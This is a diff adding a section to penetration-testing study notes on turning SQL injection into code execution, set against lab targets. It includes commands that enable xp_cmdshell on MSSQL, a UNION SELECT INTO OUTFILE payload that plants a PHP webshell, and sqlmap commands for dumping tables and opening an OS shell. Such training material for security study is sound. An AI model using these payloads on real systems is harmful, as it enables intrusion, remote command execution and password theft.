@@ -274,3 +274,87 @@ Time-based try:
 ## Manual and Automated Code Execution
 
 SQL Injections might be able to be used to read or write files in the underlying OS, which we can try to do by writing a PHP file into the root dir of the web server.
+
+In MSSQL, the xp_cmdshell function takes a string and gives it over to a cmd shell to execute. It's disabled by default, but once enabled, must be called with the EXECUTE keyword, not SELECT.
+
+```console
+$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+SQL> EXECUTE sp_configure 'show advanced options', 1;
+SQL> RECONFIGURE;
+SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
+SQL> RECONFIGURE;
+SQL> EXECUTE xp_cmdshell 'whoami';
+
+nt service\mssql$sqlexpress
+```
+
+We have full control of the system! Let's change our SQL shell to a standard reverse shell.
+
+While the various MySQL db variants don't offer one single function for RCE, we can abuse the SELECT INTO_OUTFILE statement to write files to the web server. For this to work, the file location has to be writable to the OS user running the db software.
+
+```
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
+
+The written PGP file then is:
+```
+<? system($_REQUEST['cmd']); ?>
+```
+
+Confirm this worked by accessing the new webshell file i nthe tmp folder with the id command.
+
+```
+111.111.111.111/tmp/webshell.php?cmd=id
+```
+
+If you get the output of your command, you succeded! The output of the id cmd shows the user that you are executing commands as.
+
+### Automating the Attack
+
+Sqlmap can both identify and exploit SQLi against various db engines. 
+
+```console
+sqlmap -u http://111.111.111.111/targetpage.php?user=1 -p user
+```
+
+The param (?user=) can be set to a dummy value. 
+
+This commannd can confirm that the URL is vulnerable to SQLi, but we shouldn't stop there. Let's try to dump the db table and steal passwords!
+
+```console
+sqlmap -u http://111.111.111.111/targetpage.php?user=1 -p user --dump
+```
+
+It's important to note that time-based SQLis will take a longer time to fetch this information.
+
+Sqlmap also offers the --os-shell feature, which is a param that provides us a full interactive shell.
+
+Time-based SQLi, again, will not be an ideal candidate for an interactive shell due to slowness.
+
+Intercept the POST and save it to a txt file.
+
+```
+POST /search.php HTTP/1.1
+Host: 111.111.111.111
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+Origin: http://111.111.111.111
+Connection: close
+Referer: http://111.111.111.111/search.php
+Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
+Upgrade-Insecure-Requests: 1
+
+item=test
+```
+
+Run Sqlmap with the -r param to include this txt file. Use the -p to indicate which param is vulnerable to SQLi.
+
+```console
+$ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+```
+
+You will be prompted for the web app's language, and then given a shell.
